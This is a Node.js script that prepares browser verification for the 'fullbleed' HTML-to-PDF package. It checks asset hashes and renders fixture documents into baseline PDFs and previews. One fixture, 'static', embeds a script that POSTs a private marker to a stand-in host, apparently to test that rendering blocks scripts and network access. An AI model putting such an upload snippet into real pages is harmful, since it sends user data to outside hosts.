// SPDX-License-Identifier: MIT
import assert from 'node:assert/strict';
import { readFile, writeFile, mkdir, copyFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { resolve, join, dirname } from 'node:path';
import { pathToFileURL } from 'node:url';
import { inlineFixtures } from '../test/inline-wrapping.mjs';

const root = resolve('.');
const out = join(root, 'output/browser-verification');
const site = join(out, 'site');
await mkdir(join(site, 'fixtures'), { recursive: true });
const pack = JSON.parse(await readFile('output/pack-verification/verification.json', 'utf8'));
assert(pack.ok);
const installed = join(root, 'output/pack-verification', pack.installDirectory, 'node_modules/fullbleed');
const pkg = JSON.parse(await readFile(join(installed, 'package.json'), 'utf8'));
assert.equal(pkg.version, JSON.parse(await readFile('package.json', 'utf8')).version);
assert(process.env.npm_execpath, 'Run this with npm run verify:browser:prepare.');
const copy = spawnSync(process.execPath, [process.env.npm_execpath, 'exec', '--offline', '--', 'fullbleed-browser-assets', join(site, 'fullbleed')], { cwd: dirname(dirname(installed)), encoding: 'utf8' });
assert.equal(copy.status, 0, copy.stderr);
await writeFile(join(out, 'copy-assets.json'), copy.stdout);
const manifest = JSON.parse(await readFile(join(site, 'fullbleed/build.json'), 'utf8'));
const hash = bytes => createHash('sha256').update(bytes).digest('hex');
for (const [name, file] of Object.entries(manifest.files)) {
  const bytes = await readFile(join(site, 'fullbleed', name));
  assert.equal(bytes.length, file.bytes);
  assert.equal(hash(bytes), file.sha256);
}
const browser = await import(pathToFileURL(join(installed, 'dist/browser/client.js')).href);
assert.equal(browser.version, pkg.version);
assert.throws(() => browser.createRenderer({ assetBaseUrl: '/fullbleed/' }), error => error instanceof browser.FullbleedError && error.code === 'UNSUPPORTED_BROWSER');
const node = await import(pathToFileURL(join(installed, 'src/index.js')).href);
const fixture = async name => ({ html: await readFile(`examples/${name}.html`, 'utf8'), css: await readFile(`examples/${name}.css`, 'utf8'), previewDpi: 72 });
const inputs = { invoice: await fixture('invoice'), report: await fixture('report'),
  ...Object.fromEntries(inlineFixtures.map(({ name, pages, ...input }) => [name, { ...input, previewDpi: 96 }])),
  custom: { html: '<h1>Local asset test</h1><p>Integral: ⨌</p><img src="assets/brand/logo.svg" width="80" height="40">',
    css: "body {font-family:Inter,'Noto Sans Math'}", previewDpi: 72,
    fontFiles: ['NotoSansMath-Regular.ttf'],
    assetTexts: { 'brand/logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="#175c52"/></svg>' } },
  static: { html: '<script>globalThis.documentUploadExecuted = true; fetch("https://fullbleed-invalid.example/upload", {method:"POST",body:"PRIVATE_BROWSER_MARKER"});</script><h1>PRIVATE_BROWSER_MARKER</h1><img src="https://fullbleed-invalid.example/picture.png">', css: '', previewDpi: 0 },
};
await copyFile('test/fonts/NotoSansMath-Regular.ttf', join(site, 'fixtures/NotoSansMath-Regular.ttf'));
await writeFile(join(site, 'fixtures/inputs.json'), JSON.stringify(inputs, null, 2) + '\n');
const baselines = {};
for (const [name, fixture] of Object.entries(inputs)) {
  const { fontFiles = [], assetTexts = {}, ...options } = fixture;
  options.fonts = await Promise.all(fontFiles.map(file => readFile(join(site, 'fixtures', file))));
  options.assets = Object.fromEntries(Object.entries(assetTexts).map(([key, value]) => [key, Buffer.from(value)]));
  const result = await node.renderPdf(options);
  await writeFile(join(out, name + '.pdf'), result.pdf);
  const previews = [];
  for (const [i, png] of result.previews.entries()) {
    await writeFile(join(out, `${name}-${i + 1}.png`), png);
    previews.push(hash(png));
  }
  baselines[name] = { pages: result.pages, missingGlyphs: result.missingGlyphs, pdf: hash(result.pdf), previews };
}
for (const name of ['index.html', 'harness.js']) await copyFile('test/browser/' + name, join(site, name));
const record = { package: pkg.version, engine: pkg.fullbleed.engineVersion, installedTarballSha256: pack.tarballSha256,
  ssrImportSafe: true, copyCommand: JSON.parse(copy.stdout), baselines };
await writeFile(join(out, 'prepared.json'), JSON.stringify(record, null, 2) + '\n');
console.log(JSON.stringify({ ok: true, fixtures: Object.keys(baselines).length, files: Object.keys(manifest.files).length, package: pkg.version }));
